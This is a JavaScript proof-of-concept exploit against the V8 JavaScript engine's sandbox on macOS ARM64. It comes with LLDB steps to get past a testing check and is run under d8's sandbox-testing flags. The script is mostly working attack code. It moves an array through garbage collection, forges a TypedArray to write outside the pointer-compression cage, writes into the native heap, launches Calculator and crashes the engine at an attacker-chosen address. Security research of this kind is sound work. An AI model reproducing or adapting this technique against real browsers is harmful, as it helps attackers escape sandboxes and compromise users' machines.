// V8 Sandbox Escape → Calculator + Native Heap Write + Crash PoC (macOS ARM64)
//
// Flags: --sandbox-testing --enable-os-system --expose-gc
//
// LLDB bypass for macOS SandboxTesting::Enable FATAL:
//   lldb ./d8 -- --sandbox-testing --enable-os-system --expose-gc calc_pop.js
//   (lldb) breakpoint set -n "v8::internal::SandboxTesting::Enable"
//   (lldb) run → thread return → continue
//
// === Stage 7: Native Heap Write ===
// After first run, fill these from LLDB:
//   CAGE_BASE_ABS : p/x (unsigned long long)v8::internal::Isolate::Current() & ~0xffffffffULL
//   NATIVE_TARGET : any writable C++ addr in (CAGE_BASE_ABS, CAGE_BASE_ABS+1TiB)
//                   e.g. p/x (unsigned long long)&v8::g_platform_
//                        p/x (unsigned long long)malloc(64)
// Reachable native heap range = [CAGE_BASE_ABS+1, CAGE_BASE_ABS+0xFFFFFFFFFF]

const CAGE_BASE_ABS = 0x17c000000000n;  // from crash: 0x17c041414148 − 0x41414148
const NATIVE_TARGET = 0x13c00214bf0n;   // from LLDB: malloc(64)

// ─────────────────────────────────────────────────────────────
const kPageSize = 0x40000;
const kPageMask = ~(BigInt(kPageSize) - 1n);
const kFromPage = 1 << 3;

const kTypedArrayType        = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kExternalPointerOffset = Sandbox.getFieldOffset(kTypedArrayType, 'external_pointer');
const kBasePointerOffset     = Sandbox.getFieldOffset(kTypedArrayType, 'base_pointer');

const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getBackingStoreOffset(ab) {
  const ta = new Uint8Array(ab);
  return cageView.getBigUint64(Sandbox.getAddressOf(ta) + kExternalPointerOffset, true) >> 24n;
}
function getDv(addr) {
  const o = Number(BigInt(addr) & 0xfffn), b = Number(BigInt(addr) - BigInt(o));
  return [new DataView(new Sandbox.MemoryView(b, 0x1000)), o];
}
function readBytes(addr, len) {
  const [dv, o] = getDv(addr), r = new Uint8Array(len);
  for (let i = 0; i < len; i++) r[i] = dv.getUint8(o + i);
  return r;
}
function writeBytes(addr, bytes) {
  const [dv, o] = getDv(addr);
  for (let i = 0; i < bytes.length; i++) dv.setUint8(o + i, bytes[i]);
}
function writeU32(addr, val) {
  const o = Number(BigInt(addr) & 0xfffn), b = Number(BigInt(addr) - BigInt(o));
  new DataView(new Sandbox.MemoryView(b, 0x1000)).setUint32(o, val >>> 0, true);
}
function writeU64(addr, val) {
  const o = Number(BigInt(addr) & 0xfffn), b = Number(BigInt(addr) - BigInt(o));
  new DataView(new Sandbox.MemoryView(b, 0x1000)).setBigUint64(o, BigInt(val), true);
}

function forgeTypedArray(taAddr, offsetFromCage) {
  writeBytes(taAddr, templateBytes);
  writeU32(taAddr + BigInt(kBasePointerOffset), 0);
  writeU64(taAddr + BigInt(kExternalPointerOffset), offsetFromCage << 24n);
}

// ─── waypoint collection ───────────────────────────────────────
const buffers = [], waypoints = [];
const templateTa = new Uint8Array(64);

for (let i = 0; i < 8; i++) {
  try { const ab = new ArrayBuffer(0x7fe00000); buffers.push(ab);
    const a = (getBackingStoreOffset(ab) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n); } catch(e) {}
}
for (let i = 0; i < 6; i++) {
  try { const r = new ArrayBuffer(0x80000, {maxByteLength: 0x80000000}); buffers.push(r);
    const a = (getBackingStoreOffset(r) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n); waypoints.push(a + 0x3f000n); } catch(e) {}
}
for (let i = 0; i < 80; i++) {
  try { const r = new ArrayBuffer(0x80000, {maxByteLength: 0x100000000}); buffers.push(r);
    const a = (getBackingStoreOffset(r) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n); waypoints.push(a + 0x3f000n); } catch(e) {}
}

gc();
const templateAddr  = Sandbox.getAddressOf(templateTa);
const templateBytes = readBytes(templateAddr, 64);
waypoints.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));

function step(curAddr, diff, isFirst) {
  if (!isFirst) writeU32(curAddr & kPageMask, kFromPage);
  writeU32(curAddr, (Number(diff / 4n)) << 1);
}

// ─── main ──────────────────────────────────────────────────────
function main() {
  let ta = [1.1, 2.2, 3.3];
  let cur = BigInt(Sandbox.getAddressOf(ta));
  const kTargetOffset = 73n * 0x100000000n;
  let isFirst = true;

  // Stage 1: GC chain-move ta to >292 GiB sandbox offset
  while (cur < kTargetOffset) {
    let next = -1n;
    for (const wp of waypoints) {
      const diff = wp - cur;
      if (diff > 0n && diff <= 0xfffffc00n && (diff & 3n) === 0n) next = wp;
    }
    if (next === -1n) break;
    step(cur, next - cur, isFirst);
    isFirst = false;
    gc({type: 'minor'});
    cur = next;
  }

  const cage_base_offset = cur & ~0xffffffffn;
  print(`[+] ta displaced → sandbox+0x${cur.toString(16)}`);
  print(`[+] cage_base at sandbox+0x${cage_base_offset.toString(16)} (${(Number(cage_base_offset)/2**30).toFixed(0)} GiB)`);

  // Stage 2: find committed waypoint above cage_base
  const kSandboxSize = 0x10000000000n;
  const kMinGap = 10n * 0x40000000n;
  let high_wp = -1n;
  for (const wp of waypoints)
    if (wp > cage_base_offset + kMinGap && wp < kSandboxSize) { high_wp = wp; break; }
  if (high_wp < 0n)
    for (const wp of waypoints)
      if (wp > cage_base_offset && wp < kSandboxSize) { high_wp = wp; break; }
  if (high_wp < 0n) { print("[-] No write target. Abort."); return; }

  print(`[+] Write target: sandbox+0x${high_wp.toString(16)} (${(Number(high_wp)/2**30).toFixed(1)} GiB)`);
  print(`    — ${(Number(high_wp - cage_base_offset)/2**30).toFixed(1)} GiB outside the 4 GiB compression cage`);

  // Stage 3: write sentinel
  const targetView = new DataView(new Sandbox.MemoryView(Number(high_wp), 0x40));
  targetView.setUint32(0, 0xDEADBEEF, true);

  // Stage 4: forge TypedArray → high_wp (outside cage, inside sandbox)
  forgeTypedArray(cur, high_wp - cage_base_offset);

  // Stage 5: OOB write
  ta.fill(0x41);

  // Stage 6: verify cage escape
  if (targetView.getUint32(0, true) !== 0x41414141) {
    print("[-] Cage escape failed: 0x" + targetView.getUint32(0, true).toString(16));
    return;
  }
  print(`[!!!] SANDBOX ESCAPE SUCCESS`);
  print(`      Wrote 0x41 to sandbox+${(Number(high_wp)/2**30).toFixed(1)} GiB`);
  print(`      (${(Number(high_wp - cage_base_offset)/2**30).toFixed(1)} GiB outside the compression cage)`);
  print(`      WriteSandboxedPointerField CHECK bypassed entirely`);
  print(``);

  // Stage 7: Native heap write via sandbox VAS overlap
  // macOS MAP_NORESERVE|PROT_NONE does not evict pre-existing malloc zone pages.
  // sandbox_offset = NATIVE_TARGET − sandbox_base_abs
  //                = NATIVE_TARGET − CAGE_BASE_ABS + cage_base_offset
  // If in [0, 1TiB) → Sandbox.MemoryView(sandbox_offset) hits the live native heap page.
  if (CAGE_BASE_ABS !== 0n && NATIVE_TARGET !== 0n) {
    const native_sandbox_offset = NATIVE_TARGET - CAGE_BASE_ABS + cage_base_offset;
    if (native_sandbox_offset <= 0n || native_sandbox_offset >= 0x10000000000n) {
      print(`[-] NATIVE_TARGET not reachable via sandbox VAS.`);
      const sb = CAGE_BASE_ABS - cage_base_offset;
      print(`[*] sandbox VAS: [0x${sb.toString(16)}, 0x${(sb+0x10000000000n).toString(16)})`);
    } else {
      const nativeDv = new DataView(new Sandbox.MemoryView(Number(native_sandbox_offset), 0x40));
      const before = nativeDv.getBigUint64(0, true);
      nativeDv.setBigUint64(0, 0xDEADC0DEDEADC0DEn, true);
      const after = nativeDv.getBigUint64(0, true);
      print(`[!!!] NATIVE HEAP WRITE (sandbox VAS overlap)`);
      print(`      0x${NATIVE_TARGET.toString(16)} (native heap / malloc zone)`);
      print(`      sandbox_offset: 0x${native_sandbox_offset.toString(16)}`);
      print(`      0x${before.toString(16)} → 0x${after.toString(16)}`);
      print(`      verify: memory read -s8 -fu -c1 0x${NATIVE_TARGET.toString(16)}`);
      print(``);
    }
  } else {
    print(`[*] Native heap write disabled. Fill CAGE_BASE_ABS + NATIVE_TARGET at top.`);
    print(`[*] LLDB: p/x (unsigned long long)malloc(64)  → NATIVE_TARGET`);
    print(`[*]       crash_addr − 0x41414148             → CAGE_BASE_ABS`);
    print(``);
  }

  // Stage 8: Calculator
  os.system("/usr/bin/open", ["/System/Applications/Calculator.app"]);
  print(`[+] Calculator launched`);

  // Stage 9: Crash PoC — corrupt ta map → EXC_BAD_ACCESS at attacker-controlled address
  writeU64(cage_base_offset + 0x100n, 0x4141414141414141n);
  print(`[CRASH] ta map → 0x4141414141414141`);
  print(`[CRASH] triggering access...`);
  ta.length;  // V8 reads map at 0x4141414141414141 → EXC_BAD_ACCESS
}

main();
